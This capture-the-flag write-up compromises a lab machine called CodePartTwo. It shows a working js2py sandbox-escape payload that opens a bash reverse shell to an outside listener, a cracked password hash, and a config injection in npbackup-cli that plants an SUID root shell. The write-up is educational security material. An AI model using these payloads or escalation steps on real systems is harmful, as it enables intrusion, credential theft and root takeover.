
---
# User Flag

## 1. Reconnaissance

**Target IP:** `10.10.11.82`
The engagement began with a comprehensive Nmap scan to identify open ports and services on the target machine.
**Command:**
```sh
nmap -sV -sC 10.10.11.82
```

**Results**:
The scan revealed an SSH service on port 22 and a Gunicorn web server on port 8000.
- **22/tcp:** OpenSSH 8.2p1 (Ubuntu)
- **8000/tcp:** HTTP (Gunicorn 20.0.4) - Title: "Welcome to CodePartTwo"
### Directory Fuzzing
Next, I performed directory enumeration on the web server using `ffuf` to discover hidden paths.
**Command:**

```sh
ffuf -u http://10.10.11.82:8000/FUZZ -w /path/to/wordlist.txt
```

**Findings:**
- `/downloads`
## 2. Source Code Analysis

Accessing the `/downloads` endpoint allowed me to download the application's source code. A review of the code revealed several critical findings:
1. **Vulnerable Library:** The application imports `js2py`, a library used to translate JavaScript to Python. This library is known to have sandbox escape vulnerabilities in older versions, allowing for Remote Code Execution (RCE).
2. **Hardcoded Credentials:** A secret key was left in the Flask configuration.
```python
	app.secret_key = 'S3cr3tK3yC0d3PartTw0'
```
3. **Database Path:** The application connects to a SQLite database, which was identified as being located at `app/instance/users.db` on the file system.
## 3. Exploitation (RCE via js2py)

Leveraging the `js2py` vulnerability, I injected a JavaScript payload designed to escape the sandbox, access Python's `subprocess` module, and execute a reverse shell back to my attacking machine.

**The Exploit Payload:**
I sent the following payload to the application. It traverses the Python object hierarchy to find subprocess.Popen and triggers a connection to my listener (10.10.14.122) on port 23.


```js
let cmd = "bash -c 'bash -i >& /dev/tcp/10.10.14.122/23 0>&1'"
let hacked, bymarve, n11
let getattr, obj

hacked = Object.getOwnPropertyNames({})
bymarve = hacked.__getattribute__
n11 = bymarve("__getattribute__")
obj = n11("__class__").__base__
getattr = obj.__getattribute__

function findpopen(o) {
    let result;
    for(let i in o.__subclasses__()) {
        let item = o.__subclasses__()[i]
        if(item.__module__ == "subprocess" && item.__name__ == "Popen") {
            return item
        }
        if(item.__name__ != "type" && (result = findpopen(item))) {
            return result
        }
    }
}

n11 = findpopen(obj)(cmd, -1, null, -1, -1, -1, null, null, true).communicate()
console.log(n11)
```

**Result**:

The payload executed successfully, granting a reverse shell connection as the web application user.

## 4. Lateral Movement

Once inside the system, I navigated to the exact database path identified during the source code analysis: `app/instance/users.db`.

I accessed this SQLite database and queried the user table, extracting credentials for the user **marco**.
**Extracted Hash:**

- **User:** marco
- **Hash (MD5):**
	`649c9d65a206a75f5abe509fe128bce5`

**Password** Cracking:
I used an online cracking service (CrackStation) to identify the plaintext password for this MD5 hash.
- **Result:** `sweetangelbabylove`
## 5. Privilege Escalation (User)

With the valid credentials recovered from the database, I logged into th33e target machine via SSH to gain a stable user shell.34

**Command:**

```js
ssh marco@10.10.11.82
# Password: sweetangelbabylove
```

**Success**:

I successfully authenticated as marco, accessed their home directory, and retrieved the user.txt flag.

---

# Root Flag

## 6. Privilege Escalation Enumeration

After establishing a foothold as the user **marco**, I began enumerating the system for potential privilege escalation vectors.
### Sudo Rights

I immediately checked for sudo privileges to see if `marco` could execute any commands as root.

**Command:**

```sh
sudo -l
```

Result:
The output confirmed that marco could run a custom backup binary without a password:

```sh
(ALL : ALL) NOPASSWD: /usr/local/bin/npbackup-cli
```

### Configuration Analysis

I located a configuration file named `npbackup.conf` in Marco's home directory.
- **File:** `/home/marco/npbackup.conf`
- **Permissions:** The file was writable by the user `marco`.

Analyzing the file contents, I identified a section for `pre_exec_commands`. This feature allows the backup tool to execute specific shell commands _before_ the backup process begins. Since `npbackup-cli` runs as root (via sudo), any command defined here would also be executed with root privileges.
## 7. Exploitation (Config Injection)

I decided to exploit this behavior by injecting malicious commands into the `pre_exec_commands` list. My goal was to create a copy of the bash binary, place it in a temporary folder, and set the **SUID** bit, allowing me to execute it as the file owner (root).

The Payload:
I modified /home/marco/npbackup.conf using a text editor.
- **Critial Fix:** I ensured the indentation was strictly correct (YAML syntax), aligning the commands under the `pre_exec_commands` block.
- **Optimization:** I also changed the backup `paths` to a small file (like `/etc/hosts` or the `user.txt`) to prevent the backup tool from hanging on large directories.

**Modified `npbackup.conf` Section:**

```YAML
    groups:
      default_group:
        backup_opts:
          # ... (other settings)
          pre_exec_commands:
            - cp /bin/bash /tmp/rootbash
            - chmod +xs /tmp/rootbash
```

## 8. Root Access

With the configuration file primed, I executed the backup tool using `sudo`.

**Command:**

```sh
sudo /usr/local/bin/npbackup-cli -c /home/marco/npbackup.conf -b
```

**Verification**:
Once the command finished (executing the pre-backup tasks), I verified that the backdoor was created successfully.

```sh
ls -la /tmp/rootbash
# Output: -rwsr-sr-x 1 root root ...
```

**Escalation**:
I executed the SUID binary with the -p (persist) flag to preserve the root privileges.

```sh
/tmp/rootbash -p
```

**Success**:

The prompt changed to #. I verified my identity with whoami (returning root) and navigated to /root/ to retrieve the final flag.

- **Flag Location:** `/root/root.txt`
---

### **Final Summary**

The machine **CodePartTwo** was compromised through a chain of vulnerabilities:
1. **Initial Access:** Exploiting a `js2py` sandbox escape vulnerability in the web application to gain RCE.
2. **Lateral Movement:** recovering hardcoded/stored database credentials to pivot to the user `marco`.
3. **Privilege Escalation:** Abusing a misconfigured backup script that allowed a user-controlled configuration file to execute arbitrary commands as root.